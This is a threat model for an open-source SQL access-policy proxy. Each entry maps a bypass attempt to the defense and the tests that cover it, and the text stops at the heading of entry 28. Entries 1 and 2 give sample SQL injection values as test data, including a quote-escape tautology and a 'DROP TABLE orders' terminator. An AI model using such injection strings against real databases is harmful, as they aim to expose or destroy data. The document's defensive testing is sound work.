# Threat Model

Each entry describes a potential bypass or information leak, the concrete attacks that realize it, the defense that prevents them, and the tests that verify the defense holds.

## Entry format

Each vector follows a fixed section order:

- **`Vector`** — one-sentence threat statement in present tense. What the attacker is trying to achieve.
- **`Attacks`** — numbered list of concrete exploit attempts, each a one-line descriptor (usually with an example query in backticks).
- **`Defense`** — the invariant the system maintains, described in terms of what is guaranteed. May reference specific functions and source paths (the repo is open-source).
- **`Previously`** *(optional)* — past-tense paragraph explaining an earlier defense shape that failed and was replaced. Only present when the current defense would look arbitrary without the historical context.
- **`Status`** *(optional)* — `Unmitigated` (threat known, defense not yet implemented) or `Accepted trade-off` (inherent limitation with documented rationale). Absent when the vector is fully mitigated.
- **`Tests`** — bulleted list. Each bullet names a test (`module::path::test_name (unit|integration)`) and back-references the attack number it covers (`— attack 1`). A test that covers multiple attack variants uses a comma-separated back-reference (`— attacks 1, 4`). Missing coverage is explicit: `*None — see Status*` or `*No test for attacks 2, 3 — see Status*`.

Integration tests live in `proxy/tests/policy_enforcement.rs` and spin up a real Postgres container via `testcontainers` — no manual DB setup. Unit tests live alongside the code in `proxy/src/**` as `#[cfg(test)]` modules. Run with `cargo test --workspace`.

---

## Attack vectors

### 1. SQL injection via filter_expression

**Vector**: Admin (or an attacker with policy-write privileges) creates a policy whose `filter_expression` contains raw SQL intended to escape the filter context and inject arbitrary clauses into the rewritten query.

**Attacks**:
  1. **Tautology injection** — `"filter_expression": "1=1 OR 1=1"`
  2. **Comment escape** — `"filter_expression": "true /* OR 1=1 */"`
  3. **Malformed syntax** — any expression that doesn't parse as a DataFusion SQL expression

**Defense**: Filter expressions are parsed via sqlparser → DataFusion `Expr` at policy save time (`validate_filter_expression` in `dto.rs`) and at query time. They are never string-concatenated into outgoing SQL. A parsed expression is injected as a `Filter` node in the logical plan, so the expression tree structure is preserved and any attempted "escape" resolves to a literal or sub-expression inside that node. Malformed syntax is rejected at save time with HTTP 422.

**Tests**:
  - `admin::dto::tests::validate_filter_expression_ok` (unit) — attacks 1, 2
  - `admin::dto::tests::validate_filter_expression_bad_syntax` (unit) — attack 3
  - `policy_enforcement::row_filter_tenant_isolation` (integration) — verifies injected filter cannot be escaped at query time

---

### 2. Template variable injection

**Vector**: User attribute values are substituted into `filter_expression` via template variables like `{user.tenant}`. A user whose attribute value contains SQL syntax attempts to break out of the string literal context and inject additional clauses.

**Attacks**:
  1. **Quote escape** — user's `tenant` attribute set to `"x' OR '1'='1"`, queried against a filter `tenant = {user.tenant}`
  2. **Embedded terminator** — attribute value `"acme'; DROP TABLE orders; --"`

**Defense**: Template variable substitution constructs typed `Expr::Literal` values (`ScalarValue::Utf8`, `Int64`, `Boolean`, etc.) based on the attribute definition's `value_type`. The attribute value is inserted as a literal node in the DataFusion expression tree, never parsed as SQL. There is no string-level substitution step where an unquoted value could escape. The rewritten filter for the quote-escape attack becomes `tenant = 'x'' OR ''1''=''1'` — the entire value, quotes included, becomes one literal string that cannot match any real tenant and returns zero rows.

**Tests**:
  - `policy_enforcement::template_variable_injection` (integration) — attacks 1, 2

---

### 3. Policy bypass via table aliases

**Vector**: User runs a query with a table alias hoping the alias causes the row filter matcher to miss the table and return unfiltered rows.

**Attacks**:
  1. **Bare alias** — `SELECT * FROM orders AS o WHERE 1=1`

**Defense**: DataFusion's `TableScan` node always contains the real table name regardless of alias. Row filter matching uses the `TableScan`'s `table_name`, not any user-supplied alias, so the filter is injected below the scan before any alias-qualified reference exists.

**Tests**:
  - `policy_enforcement::table_alias_bypass` (integration) — attack 1

---

### 4. Policy bypass via CTEs

**Vector**: User wraps the target table in a Common Table Expression hoping the CTE boundary causes the row filter matcher to miss the underlying table.

**Attacks**:
  1. **CTE wrapping** — `WITH data AS (SELECT * FROM orders) SELECT * FROM data`

**Defense**: DataFusion inlines CTEs into the logical plan before policy enforcement runs. The `TableScan` for `orders` remains in the plan tree and receives the row filter injection via `transform_up`, exactly as it would without the CTE.

**Tests**:
  - `policy_enforcement::cte_bypass` (integration) — attack 1

---

### 5. Column mask bypass via compound expressions

**Vector**: User references a masked column inside a compound expression in the `SELECT` list, hoping the expression evaluator operates on the raw column value rather than the masked value and returns sensitive data.

**Attacks**:
  1. **Concatenation wrapper** — `SELECT ssn || '' FROM customers` where `ssn` is masked
  2. **Function call wrapper** — `SELECT UPPER(ssn) FROM customers`
  3. **Arithmetic on masked numeric** — `SELECT salary * 1 FROM employees` where `salary` is masked

**Defense**: Column masking is enforced at the `TableScan` level via `apply_column_mask_at_scan`, which injects a mask `Projection` directly above each scan. The mask expression replaces the column at the source — every downstream reference in the same query (compound expressions, function calls, arithmetic) resolves to the already-masked value. The raw value never leaves the scan. The result is masked-but-transformed (e.g., `***-**-6789` concatenated with an empty string), not raw.

**Status**: *Accepted trade-off* — compound expressions applied to masked values produce a transformed output that depends on the mask shape. This is safe (the result is derived from masked data, not raw data), but callers may observe unexpected output when the mask is designed for display rather than computation. Use `column_deny` when even transformations must be blocked.

**Tests**: *Covered transitively by vectors 13 and 32* — `policy_enforcement::row_filter_and_column_mask_same_column` demonstrates that downstream operations (row filter evaluation) see masked values; unit tests in `hooks::policy::tests` (`test_exec_permit_column_mask`) confirm direct reference returns the masked value.

---

### 6. Star expansion bypass of column_deny

**Vector**: User runs `SELECT *` against a table with denied columns, hoping the star expansion produces a schema containing the denied columns (which would leak them into the result set) because the policy matcher only inspects named column references.

**Attacks**:
  1. **Bare star on deny target** — `SELECT * FROM customers` where `ssn` and `credit_card` are denied

**Defense**: Enforcement happens at two levels. First, `compute_user_visibility` removes denied columns from the per-user `SessionContext` schema at connection time, so DataFusion's `*` expansion runs against a catalog that already excludes the denied columns. Second, the top-level `Projection` is rewritten by `apply_projection_qualified` as defense-in-depth, stripping any denied columns that might have reached that far.

**Tests**:
  - `policy_enforcement::star_expansion_column_deny` (integration) — attack 1

---

### 7. Cross-table info leak via JOINs

**Vector**: User runs a JOIN that reads columns from a second table, hoping that per-table row filters apply only to the outer (driving) table and leave the joined table unfiltered.

**Attacks**:
  1. **Two-table JOIN** — `SELECT c.ssn FROM orders o JOIN customers c ON o.customer_id = c.id`

**Defense**: Row filters are applied to each `TableScan` independently via `transform_up`. The filter on `customers` is injected below the `customers` scan; the filter on `orders` below `orders`. The JOIN node sees two already-filtered input streams.

**Tests**:
  - `policy_enforcement::join_both_tables_filtered` (integration) — attack 1

---

### 8. Row filter bypass via subqueries

**Vector**: User wraps the target table in a subquery-in-FROM hoping the subquery boundary causes the row filter matcher to miss the underlying table.

**Attacks**:
  1. **Subquery-in-FROM** — `SELECT * FROM (SELECT * FROM orders) sub`

**Defense**: DataFusion's logical planner inlines subqueries into the plan tree. The `TableScan` for `orders` remains present and receives the row filter injection via `transform_up`, exactly as it would without the subquery wrapping.

**Tests**:
  - `policy_enforcement::subquery_bypass` (integration) — attack 1

---

### 9. access_mode bypass

**Vector**: Datasource is configured with `access_mode = "policy_required"` (zero-trust mode). User queries a table that has no matching `column_allow` policy, hoping the query reaches the upstream database and returns rows.

**Attacks**:
  1. **Unassigned table query** — `SELECT * FROM orders` against a `policy_required` datasource where `orders` has no `column_allow` policy

**Defense**: `compute_user_visibility` only marks a table as visible when at least one `column_allow` policy matches it. In `policy_required` mode, tables without a matching `column_allow` are removed from the per-user `SessionContext` catalog entirely, and `PolicyHook` additionally injects `Filter(lit(false))` at the table scan level as defense-in-depth. No upstream round-trip occurs — the empty result is materialized locally.

**Tests**:
  - `policy_enforcement::policy_required_no_policy_table_not_found` (integration) — attack 1

---

### 10. Optimistic concurrency bypass on policy updates

**Vector**: Two admins edit the same policy simultaneously. Each reads version 1, each submits an update with version 1. Without optimistic-concurrency enforcement, the second write silently overwrites the first — the first admin's changes are lost with no indication, and the second admin is unaware that a concurrent edit occurred.

**Attacks**:
  1. **Concurrent update with matching version** — two `PUT /policies/{id}` requests both carrying `version: 1`; exactly one must succeed and the other must return HTTP 409 Conflict

**Defense**: `PUT /policies/{id}` requires the current `version` in the request payload. The update runs as a conditional `UPDATE ... WHERE version = ?` and then increments `version`. If the row count is 0 (no row matched the conditional), the server returns HTTP 409 Conflict. The client must reload the policy to get the current version and retry the edit.

**Tests**:
  - `admin::policy_handlers::tests::update_policy_version_conflict_409` (unit) — attack 1

---

### 11. column_deny strips columns at query time

**Vector**: A user with an assigned `column_deny` policy on a sensitive column runs a query that would return that column. The column must be stripped from the result, while all other requested columns continue to flow through normally (unlike `table_deny`, which short-circuits the entire query).

**Attacks**:
  1. **Projection containing denied column** — `SELECT id, ssn, name FROM customers` where `ssn` is denied; must return only `id` and `name` without the denied column and without short-circuiting the query
  2. **Explicit-only denied column** — `SELECT ssn FROM customers` where `ssn` is the only requested column; must error with SQLSTATE `42501` (see vector 15), not return silent empty rows

**Defense**: `column_deny` is a first-class policy type with two-layer enforcement: (1) visibility-level, where `compute_user_visibility` removes denied columns from the per-user `SessionContext` schema at connection time, so the planner never sees the column; (2) defense-in-depth, where `apply_projection_qualified` rewrites the top-level `Projection` to drop any denied columns that slipped through (e.g., via decision function opt-outs). Policy mutations trigger an immediate `SessionContext` rebuild for all active connections on the datasource, so deny policies take effect without requiring users to reconnect.

**Tests**:
  - `policy_enforcement::star_expansion_column_deny` (integration) — attack 1 (demonstrates the denied column is stripped from a mixed projection)
  - `policy_enforcement::denied_column_error` (integration) — attack 2 (see vector 15 for full coverage)

---

### 12. Disabled policies still enforced in visibility layer

**Vector**: Admin disables a `column_deny` policy (sets `is_enabled = false`), expecting the denied column to reappear in the user's schema and query results. The policy should stop contributing to enforcement immediately.

**Attacks**:
  1. **Disabled deny still hides column** — admin disables a `column_deny` policy on `ssn`; user queries `information_schema.columns` or `SELECT ssn FROM customers` and the column remains hidden

**Defense**: `compute_user_visibility()` loads policies only for *enabled* policy IDs via an `is_enabled = true` filter in the database query. Disabled policies contribute nothing to `visible_tables` or `denied_columns`. Policy mutations trigger an immediate `SessionContext` rebuild for all active connections on the datasource, so schema visibility changes take effect without requiring the user to reconnect.

**Previously**: `compute_user_visibility()` loaded policies for ALL assigned policy IDs regardless of enable state. The `column_access deny` branch did not check the parent policy's `is_enabled` flag, so disabling a policy had no effect on schema visibility — the column stayed hidden until the admin also unassigned or deleted the policy.

**Tests**:
  - `engine::tests::test_disabled_policy_column_deny_not_applied` (unit) — attack 1 (disabled → `denied_columns` empty)
  - `engine::tests::test_enabled_policy_column_deny_applied` (unit) — control (enabled → `denied_columns` contains `ssn`)

---

### 13. Column mask had no effect — original values returned

**Vector**: Admin creates a `column_mask` policy with a non-trivial expression (e.g. `'***-**-' || RIGHT(ssn, 4)`) expecting sensitive values to be replaced in the result. The mask must successfully parse, resolve against the real query plan, and substitute in place of the raw column.

**Attacks**:
  1. **Literal mask** — policy sets `mask_expression = 'REDACTED'`; every SSN value in the result must equal `"REDACTED"`
  2. **Mask combined with row filter** — row filter narrows to 3 rows, mask replaces `ssn` with `'***'`; all 3 rows returned and all SSN values masked
  3. **Deny overrides mask on same column** — a column is both masked and denied; deny takes priority and the column is absent from the result entirely

**Defense**: `parse_mask_expr` is synchronous and uses `sql_ast_to_df_expr(..., Some(ctx))` — the same sqlparser → DataFusion AST converter used for row filter expressions, extended with the session's `FunctionRegistry` for built-in function lookup. The parsed expression uses unqualified column references (`col("ssn")`) that resolve against the real query plan's `TableScan`. No standalone plan is built, and no alias wrapping occurs inside the parser — `apply_projection` provides the final column alias.

**Previously**: `parse_mask_expr` built a standalone SQL plan (`SELECT {mask} AS {col} FROM {schema}.{table}`) via `ctx.sql()`, then extracted the first `Projection` expression and injected it into the real query plan. Two problems compounded: (a) the extracted expression was already `Alias(inner, "ssn")` from the standalone plan's `AS ssn` clause, and `apply_projection` wrapped it again with `.alias(col_name)` — producing `Alias(Alias(...))`, which DataFusion silently resolved by dropping the inner alias and causing column-not-found or type-mismatch errors at execution time; and (b) the inner expression carried table-qualified column references (e.g. `public.customers.ssn`) bound to the standalone plan's `TableScan`, which did not resolve against the real query plan, causing the mask to evaluate to NULL or error out. Raw SSN values were returned in both failure modes.

**Tests**:
  - `hooks::policy::tests::test_exec_permit_column_mask` (unit) — attack 1
  - `hooks::policy::tests::test_exec_column_mask_with_row_filter` (unit) — attack 2
  - `hooks::policy::tests::test_deny_overrides_mask` (unit) — attack 3

---

### 14. Two permit policies with row_filter combined as union instead of intersection

**Vector**: A user is assigned two narrow `row_filter` permit policies on the same table (e.g. Policy A: `org_id = 'acme'`, Policy B: `status = 'active'`). An incorrect combinator would return the union of allowed rows — the user would see rows from Policy A *or* Policy B, including rows from other tenants or inactive records that neither policy alone intended to expose.

**Attacks**:
  1. **Disjoint filter union** — user assigned policies with `org_id = 'acme'` and `org_id = 'globex'`; a union would return rows from both tenants, an intersection returns zero rows (correct behavior)
  2. **Overlapping filter union** — user assigned `org_id = 'acme'` and `name != 'Charlie'`; a union would return all acme rows plus all non-Charlie rows, an intersection returns only acme rows that are not Charlie

**Defense**: Cross-policy row filters are combined with AND semantics in `PolicyEffects::collect()` — seed `lit(true)`, fold with `.and()`. Each permit policy adds a restriction; users see the intersection of all matching permits. Within a single policy, multiple `row_filter` entries are also AND'd (unchanged). Deny policies are unaffected — the deny short-circuit on first match is equivalent to OR across denies.

**Previously**: Cross-policy row filters were combined with OR semantics (seed `lit(false)`, fold with `.or()`). The intent was "any permit match grants access," but this allowed a user assigned multiple narrow policies to see the union of all their allowed sets — broader than any single policy intended.

**Tests**:
  - `hooks::policy::tests::test_exec_two_permits_row_filter_and` (unit) — attack 1 (disjoint → 0 rows)
  - `hooks::policy::tests::test_exec_two_permits_row_filter_and_overlapping` (unit) — attack 2 (overlapping → intersection only)
  - `hooks::policy::tests::test_row_filters_and_across_policies` (unit) — plan structure verification (AND expression with both filter values)

---

### 15. SELECT on denied column returns silent empty rows instead of an error

**Vector**: User runs a query that selects only denied columns. A silent empty result (rows with no columns) would be misleading — the user might conclude the column exists but is empty in the database, rather than understanding it is policy-blocked.

**Attacks**:
  1. **Select only a denied column** — `SELECT ssn FROM customers` where `ssn` is denied
  2. **Select multiple denied columns** — `SELECT ssn, credit_card FROM customers` where both are denied

**Defense**: After column-deny stripping in `PolicyHook`, if the resulting projection expression list is empty, the hook returns a SQLSTATE `42501` (insufficient_privilege) error naming the denied columns — before any plan is built. The user receives an explicit access-denied error, not a silent zero-column result set.

**Previously**: When all selected columns were stripped by `column_access deny`, `new_exprs` became empty and `LogicalPlanBuilder::project([])` produced a zero-column projection that DataFusion executed successfully — returning N rows with no column data. Clients rendered this as a screen full of empty rows, which looked like "the column exists but has null values for every row" rather than "access denied."

**Tests**:
  - `policy_enforcement::denied_column_error` (integration) — attack 1 (asserts the response is an error, not a result set)

---

### 16. Deny semantics and column_mask are mutually exclusive by type system construction

**Vector**: Admin attempts to create an "inconsistent" policy that combines deny semantics with a mask expression, hoping the mask silently fails to apply and the raw column is returned while the policy appears active.

**Attacks**:
  1. **column_mask without mask expression** — POST `/policies` with `policy_type = "column_mask"` and no `mask_expression`
  2. **table_deny with column targets** — POST `/policies` with `policy_type = "table_deny"` and a `columns` array in the definition

**Defense**: The flat `policy_type` enum eliminates the "deny + mask" combination by construction. There is no `effect` field. `column_mask` is always permit semantics and requires a `mask_expression`. `column_deny` and `table_deny` are always deny semantics and reject any `definition` content that would overlap with permit types. `validate_definition()` in `dto.rs` enforces these shape constraints at API level, returning HTTP 422 for any mismatch. The wrong combination is unrepresentable in the type system — not merely validated against at runtime.

**Tests**:
  - `admin::policy_handlers::tests::create_column_mask_requires_columns_422` (unit) — attack 1
  - `admin::policy_handlers::tests::create_table_deny_columns_rejected_422` (unit) — attack 2

---

### 17. table_deny with wildcard tables blocks the whole schema

**Vector**: Admin creates a `table_deny` policy targeting an entire schema with `tables: ["*"]`, expecting every current and future table in that schema to be blocked for the assigned user while tables in other schemas remain accessible.

**Attacks**:
  1. **Query a wildcard-denied table** — `SELECT * FROM analytics.events` against a datasource where a `table_deny` targets `{ schemas: ["analytics"], tables: ["*"] }`; must fail with "table not found" (see vector 26 for why the error is "not found" and not "access denied")
  2. **Query an un-denied table in another schema** — `SELECT * FROM public.orders` against the same datasource; must return normal results (other schemas unaffected)

**Defense**: `compute_user_visibility()` in `engine/mod.rs` processes `table_deny` policies and populates `denied_tables` with all matching `(df_alias, table)` pairs. `build_user_context()` removes tables in `denied_tables` from the per-user `SessionContext` catalog entirely, so they are invisible in both `information_schema` queries and direct table references. Because `tables: ["*"]` matches every table in the target schema, the entire schema becomes inaccessible. This applies in both `open` and `policy_required` modes. At query time, `PolicyHook` short-circuits on the first `table_deny` match as defense-in-depth.

**Tests**:
  - `policy_enforcement::object_access_deny_schema` (integration) — attacks 1, 2

---

### 18. table_deny on a specific table leaves other tables in the same schema accessible

**Vector**: Admin creates a `table_deny` policy on a specific table (e.g. `public.payments`), expecting only that table to be blocked while the rest of the same schema remains fully accessible. An over-broad implementation could accidentally also deny sibling tables in the same schema.

**Attacks**:
  1. **Query the specifically-denied table** — `SELECT * FROM public.payments` where `table_deny` targets `{ schemas: ["public"], tables: ["payments"] }`; must fail with "table not found"
  2. **Query a sibling table in the same schema** — `SELECT * FROM public.orders` on the same datasource; must return normal results (other tables unaffected)

**Defense**: `compute_user_visibility()` matches `table_deny` policies against each candidate `(schema, table)` pair via `matches_schema_table()`. An exact-name pattern like `"payments"` matches only the `payments` table, not other tables in `public`. Matching tables are added to `denied_tables` and removed from the per-user catalog; non-matching tables are untouched. At query time, `PolicyHook` short-circuits on the first `table_deny` match as defense-in-depth.

**Tests**:
  - `policy_enforcement::object_access_deny_table` (integration) — attacks 1, 2

---

### 19. Glob pattern matching bypassed with unexpected table name

**Vector**: Admin uses a glob pattern in policy target matching (e.g. `tables: ["raw_*"]`) expecting all tables whose names start with `raw_` to match. A mismatch between the pattern matcher's semantics and the admin's mental model would leak rows from tables the admin believed were covered.

**Attacks**:
  1. **Prefix glob on table name** — pattern `"raw_*"` must match `raw_events`, `raw_orders`; must not match `orders_raw` or unrelated tables
  2. **Prefix glob on schema name** — pattern `"staging_*"` must match `staging_us`, `staging_eu`; must not match `production_staging`
  3. **Combined schema + table glob** — pattern `{schemas: ["raw_*"], tables: ["*"]}` must match every table in any `raw_*` schema
  4. **Case-sensitive matching** — pattern `"Orders"` must not match `orders` (SQL identifiers are case-sensitive here)
  5. **Wildcard in middle or suffix** — patterns not ending in `*` fall back to exact match

**Defense**: `matches_pattern()` in `policy_match.rs` implements prefix glob: a pattern ending in `*` becomes a `starts_with(prefix)` check against the candidate string; all other patterns are exact matches. `matches_schema_table()` delegates to `matches_pattern()` for both schema and table fields. The same function is used by both `PolicyHook` (query-time) and `compute_user_visibility()` (connect-time), ensuring the two enforcement paths cannot drift in semantics.

**Tests**:
  - `policy_match::tests::test_matches_pattern_exact` (unit) — exact match baseline
  - `policy_match::tests::test_matches_pattern_wildcard_any` (unit) — bare `*` matches everything
  - `policy_match::tests::test_matches_pattern_prefix_glob` (unit) — attack 1 prefix case
  - `policy_match::tests::test_matches_pattern_suffix_glob` (unit) — non-prefix patterns fall back to exact
  - `policy_match::tests::test_matches_pattern_case_sensitive` (unit) — attack 4
  - `policy_match::tests::test_table_glob_prefix_match` (unit) — attack 1 (table glob)
  - `policy_match::tests::test_table_glob_prefix_no_suffix` (unit) — negative case for attack 1
  - `policy_match::tests::test_schema_glob_prefix_match` (unit) — attack 2
  - `policy_match::tests::test_glob_both_schema_and_table` (unit) — attack 3

---

### 20. Policy type encodes grant vs strip — no ambiguous action field

**Vector**: Admin sets an `action` field inside a policy definition that conflicts with the policy's effect, hoping the resulting ambiguity causes visibility decisions to silently take the wrong branch — either granting access that should be denied, or hiding tables that should be visible.

**Attacks**:
  1. **Grant a denied column via wildcard** — `column_allow` policy with `columns: ["*"]` in `policy_required` mode must grant visibility to every column in the target table
  2. **column_deny alone does not grant visibility** — a user with only a `column_deny` policy on a table in `policy_required` mode must not see the table at all (deny alone is not a permit)

**Defense**: The `action` field was removed entirely from policy definitions. Intent is now encoded directly in `policy_type`:
- `column_allow` — always an allowlist. Grants table access in `policy_required` mode and specifies the visible column set.
- `column_deny` — always a denylist. Strips columns at query time; does not grant access on its own.

`compute_user_visibility()` branches on `policy_type` directly. `validate_targets()` in `dto.rs` enforces that both `column_allow` and `column_deny` require a non-empty `columns` array. The type system makes "permit-effect with deny-shaped definition" unrepresentable.

**Previously**: `column_access` obligations carried an `action` field (`"allow"` or `"deny"`) inside the definition JSON, independent of the policy's effect. A `permit`-effect policy with `"action": "deny"` would silently deny access — `compute_user_visibility()` checked `col_def.action == "allow"` to decide whether to grant table access, and a mismatch caused the user to see "table not found" in `policy_required` mode instead of the data the admin intended to expose.

**Tests**:
  - `engine::tests::test_permit_column_access_wildcard_grants_full_visibility_policy_required` (unit) — attack 1
  - `engine::tests::test_column_deny_cross_table_isolation` (unit) — attack 2 (column_deny alone does not grant)

---

### 21. Denied queries must leave an audit trail

**Vector**: A user submits a query that is blocked by a deny policy or fails at plan time. If the audit log is only written on the success path, there is no record of the denied attempt — attackers can probe policy boundaries, learn which tables exist and which are protected, and enumerate deny rules without leaving evidence. Audit coverage must be total: every query that reached the proxy produces an audit row, regardless of outcome.

**Attacks**:
  1. **Success still audited** — successful query → audit row with `status: "success"`, non-null `execution_time_ms`, `rewritten_query` contains actual SQL
  2. **Deny-policy rejection audited** — deny-policy query → audit row with `status: "denied"`, `error_message` non-null
  3. **Plan-time error audited** — query for a non-existent table → audit row with `status: "error"`, `error_message` populated
  4. **Status filtering on the audit API** — `GET /audit/queries?status=denied` returns only denied entries

**Defense**: `handle_query` in `PolicyHook` uses a labeled block (`'query: { ... }`) that unconditionally returns a tuple `(result, status, error_message, rewritten_query)` on every exit path — success, denied, error. The audit write follows the block and runs for every auditable query regardless of outcome. Status values are constrained to `"success"`, `"error"`, or `"denied"`. Write-statement rejections are audited separately by the same hook before `ReadOnlyHook` runs (see vector 24).

**Previously**: The `tokio::spawn` audit write in `PolicyHook::handle_query` was placed after all `return Some(Err(...))` paths. Any failed or denied query short-circuited before reaching the audit write — denied attempts and plan-time errors produced zero audit records, leaving a probe-shaped blind spot in the audit trail.

**Tests**:
  - `policy_enforcement::tc_audit_01_success_audit_status` (integration) — attack 1
  - `policy_enforcement::tc_audit_02_denied_audit_status` (integration) — attack 2
  - `policy_enforcement::tc_audit_03_error_audit_status` (integration) — attack 3
  - `policy_enforcement::tc_audit_04_status_filter` (integration) — attack 4

---

### 22. Audit duration must cover the full user-perceived latency

**Vector**: The `execution_time_ms` field in the audit log must reflect the time the user actually waited for their result — planning + policy evaluation + execution + encoding. If the timestamp is captured before the lazy `DataFrame` has been materialized, the recorded duration systematically under-reports latency, making forensic timing comparisons unreliable and masking slow queries.

**Attacks**:
  1. **Slow query under-reported** — a query that takes 2 seconds to encode a large result set must record at least 2 seconds in `execution_time_ms`, not just the sub-millisecond planning time

**Defense**: `elapsed_ms` is captured after the labeled block exits — covering planning, policy evaluation, logical-plan execution, *and* encoding into the pgwire response. `DataFrame` is a lazy structure in DataFusion, and the actual row fetching happens during `encode_dataframe`; placing the timestamp after encoding captures the full user-perceived latency.

**Previously**: `execution_time_ms` was captured after `execute_logical_plan` but before `encode_dataframe`. The recorded duration covered only the planning phase (which is effectively free for most queries), and the encoding phase — where the lazy `DataFrame` actually fetched and formatted rows — was entirely excluded. Audit entries for a 2-second query showed `execution_time_ms` near zero, making performance forensics useless.

**Tests**:
  - `policy_enforcement::tc_audit_01_success_audit_status` (integration) — attack 1 (asserts `execution_time_ms ≥ 0` and non-null)

---

### 23. Rewritten query in audit log must be the real rewritten SQL

**Vector**: The audit log stores both the original query and a `rewritten_query` field that is supposed to show the actual SQL executed after policy enforcement. If the rewritten field is a fake placeholder (e.g., the original query with a comment prepended), the audit trail is useless for debugging policy behavior and for proving to auditors what was actually run against the upstream database.

**Attacks**:
  1. **Placeholder rewritten_query** — a policy-rewritten query whose audit row's `rewritten_query` field equals the original query with only a `/* policy-rewritten */` comment prepended provides no forensic value; the field must contain the real post-rewrite SQL showing injected filters and mask expressions

**Defense**: DataFusion's `Unparser` with the custom `BetweenRowsPostgresDialect` serializes the final `LogicalPlan` (after all policy rewrites — row filters, column masks, deny strips) back to SQL. The resulting string is stored as `rewritten_query` in the audit row. If unparsing ever fails (rare, usually due to a new plan node type), the fallback is `/* plan-to-sql failed */ {original_query}` — which explicitly signals the failure rather than silently lying.

**Previously**: `rewritten_query` was built by prepending `/* policy-rewritten */` to the original query string. It contained no information about which filters or masks had been applied, so audit consumers could not verify policy enforcement from the log alone — the field was decorative, not diagnostic.

**Tests**:
  - `policy_enforcement::tc_audit_01_success_audit_status` (integration) — attack 1 (asserts `rewritten_query` must not contain the `/* policy-rewritten */` placeholder and must be non-empty when a row filter is applied)

---

### 24. Rejected write statements must be audited

**Vector**: BetweenRows is read-only by design — `ReadOnlyHook` rejects any write statement (INSERT, UPDATE, DELETE, DROP, SET, etc.). If the rejection happens *before* `PolicyHook` runs, the attempted write produces no audit record. An attacker can probe write access (testing which statement types are allowed, which tables exist, which DDL keywords the proxy recognizes) without leaving any evidence.

**Attacks**:
  1. **Probe via INSERT** — `INSERT INTO customers VALUES (...)` against the proxy; must be rejected with a "read-only" error *and* must produce an audit row with `status: "denied"` and `error_message` containing `"read-only"`
  2. **Probe via DROP** — same shape with `DROP TABLE`; same requirement

**Defense**: Hook execution order is `[PolicyHook, ReadOnlyHook]`. `PolicyHook` runs first: for non-`Query` statements that are not on the shared read-only passthrough allowlist, it calls `audit_write_rejected()` (writing a `"denied"` audit entry with `error_message: "Only read-only queries are allowed"`) before returning `None` to yield to the next hook. `ReadOnlyHook` then runs and enforces the actual rejection with SQLSTATE `25006`. The `is_allowed_statement()` function in `read_only.rs` is the single source of truth for the allowlist — `PolicyHook` uses it to decide which statements to audit, so the audit decision cannot drift from the rejection decision.

**Previously**: Hook order was `[ReadOnlyHook, PolicyHook]`. `ReadOnlyHook` returned `Some(Err(...))` for write statements and short-circuited the hook chain entirely, so `PolicyHook` never saw the statement and never had a chance to audit it. Write-probe attempts produced error responses with no corresponding audit rows.

**Tests**:
  - `policy_enforcement::tc_audit_05_write_rejected_audit_status` (integration) — attacks 1, 2 (asserts the audit row for a rejected INSERT has `status: "denied"` and `error_message` contains `"read-only"`)

---

### 25. Row filter on aggregate with zero-column projection

**Vector**: User runs an aggregate query that references no non-aggregate columns, hoping the optimized plan skips row filter injection and returns rows outside the tenant scope — or crashes the query entirely and denies service.

**Attacks**:
  1. **COUNT(\*)** — `SELECT COUNT(*) FROM orders`
  2. **SUM of one column** — `SELECT SUM(amount) FROM orders`

**Defense**: Before wrapping a `TableScan` with a `Filter` node, `apply_row_filters` extracts column references from the filter expression via `Expr::column_refs()`. If the scan's `projection` is `Some(indices)`, any missing column indices required by the filter are merged into the projection and the `TableScan` is rebuilt via `TableScan::try_new(...)` with the expanded list. `lit(false)` and other zero-column-ref filters are a no-op (no expansion). A filter referencing a column absent from the full table schema returns a plan error.

**Previously**: `apply_row_filters` injected the filter unconditionally without checking whether filter-referenced columns were present in the scan's projected schema. DataFusion 52+ optimised `SELECT COUNT(*) FROM t` to `TableScan(projection = Some([]))` — projecting zero columns. The injected `Filter(tenant = 'acme')` node could not resolve `tenant` against an empty scan schema, causing a schema mismatch at execution time and failing the query.

**Tests**:
  - `policy_enforcement::aggregate_with_row_filter` (integration) — attacks 1, 2

---

### 26. table_deny metadata leakage — 404-not-403 principle

**Vector**: A `table_deny` policy that rejects queries with "access denied" (rather than "table not found") reveals the existence of the table to the attacker. By observing the difference between the two error types, an attacker can enumerate hidden tables without ever accessing their data — the error message itself is the side channel.

**Attacks**:
  1. **Error message discrimination** — attacker runs `SELECT * FROM secrets_table` and inspects the error; the error must be indistinguishable from querying a genuinely non-existent table, and must not contain the policy name or any language suggesting the table exists but is hidden
  2. **Audit status discrimination** — attacker with audit read access inspects the query audit log; the `status` field must match the "plan error" status (not a distinct "denied" status) and `error_message` must not contain the policy name

**Defense**: `table_deny` tables are removed from the per-user catalog at connection time by `build_user_context` / `compute_user_visibility`. Queries against a denied table fail with "table not found" at DataFusion's planner — indistinguishable from querying a genuinely non-existent table because the table is literally absent from the catalog the planner sees. The audit `status` is `"error"` (not `"denied"`), matching any other query planning failure. The policy name is never included in the error message or the audit entry for these queries.

**Tests**:
  - `policy_enforcement::deny_policy_row_filter_rejected` (integration) — attack 1 (error message must not contain the policy name)
  - `policy_enforcement::tc_audit_02_denied_audit_status` (integration) — attack 2 (audit status and error message verification)
  - `policy_enforcement::tc_audit_04_status_filter` (integration) — attack 2 (audit `status=error` filter matches these entries)

---

### 27. Column deny scoping in multi-table JOINs

**Vector**: Multiple joined tables share a column name (e.g. three tables each with a `name` column). A policy denies `name` on a subset of those tables. Unqualified matching in the deny logic would either over-apply (strip `name` from all tables, including the one where it's allowed) or under-apply (leak `name` from the denied tables into the joined result).

**Attacks**:
  1. **Shared column name across 3 joined tables** — JOIN tables `a`, `b`, `c` all with a `name` column, deny `name` on `a` and `c` only; `SELECT *` must return exactly one `name` column (from `b`) plus `id` from all three

**Defense**: Column deny is enforced at two levels: (1) visibility-level via `compute_user_visibility` / `build_user_context` — denied columns are removed from the per-user `SessionContext` schema at connect time, scoped per-table; (2) defense-in-depth via `apply_projection_qualified` — the top-level Projection uses DFSchema qualifiers (`(table, column)` pairs) to match deny patterns against the source table only, so a deny on `a.name` cannot accidentally match `b.name`.

**Tests**:
  - `policy_enforcement::tc_join_02_multi_table_join_shared_name` (integration) — attack 1

---

### 28. Table alias does not bypass column deny or column mask

